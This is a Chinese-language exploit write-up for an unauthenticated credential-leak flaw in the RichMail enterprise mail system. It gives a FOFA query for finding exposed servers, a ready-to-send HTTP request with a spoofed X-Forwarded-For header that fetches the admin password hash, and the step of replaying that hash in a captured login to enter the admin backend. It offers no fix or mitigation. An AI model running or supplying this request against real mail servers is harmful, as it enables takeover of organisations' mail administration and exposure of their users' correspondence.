# RichMail 企业邮箱敏感信息泄漏漏洞

# 一、漏洞简介
<font style="color:rgb(0, 0, 0);">  Richmail是亚太本土最大的电子邮件系统提供商之一，是新一代智慧企业云邮件系统，以安全、稳定、高效著称。Richmail作为投资千万，自主研发的邮件系统，获得了多项发明专利，凭借移动化、套件化、能力开放及服务计量等等核心技术，持续引领全球邮箱领域的发展方向，每天数以亿计的智慧和信息在Richmail汇聚、碰撞、传递。RichMail某版本存在信息泄漏漏洞，未经授权的攻击者可以利用此漏洞获取企业邮箱的账号密码信息，登陆管理后台。</font>

# <font style="color:rgb(0, 0, 0);">二、影响版本</font>
+ RichMail 企业邮箱

# 三、资产测绘
+ fofa`app="Richmail-企业邮箱"`
+ 特征

![1698649024138-ac0b79ce-40c0-4dcd-a7e8-6e25b26e5202.png](./img/JPHu9Cvqk-3yYyGV/1698649024138-ac0b79ce-40c0-4dcd-a7e8-6e25b26e5202-025912.png)

# 四、漏洞复现
按需调整`X-Forwarded-For: 127.0.0.1`

```plain
GET /RmWeb/noCookiesMail?func=user:getPassword&userMailName=admin HTTP/1.1
Host: xx.xx.xx.xx
Cookie: lang=zh_CN
X-Forwarded-For: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
```

![1698649060171-6bcea3b8-efd4-4a42-bd6b-bb9f6f17cff0.png](./img/JPHu9Cvqk-3yYyGV/1698649060171-6bcea3b8-efd4-4a42-bd6b-bb9f6f17cff0-811517.png)

获取管理员MD5加密值后抓去登陆数据包替换即可进入后台

![1698649267168-8c5ddd8b-5070-4841-9109-627032ea6d62.png](./img/JPHu9Cvqk-3yYyGV/1698649267168-8c5ddd8b-5070-4841-9109-627032ea6d62-103965.png)

![1698649300470-de7ba283-6de1-4d76-91f7-f3254744b023.png](./img/JPHu9Cvqk-3yYyGV/1698649300470-de7ba283-6de1-4d76-91f7-f3254744b023-812193.png)



> 更新: 2024-02-29 23:57:46  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/nngn0owe1cvrrahv>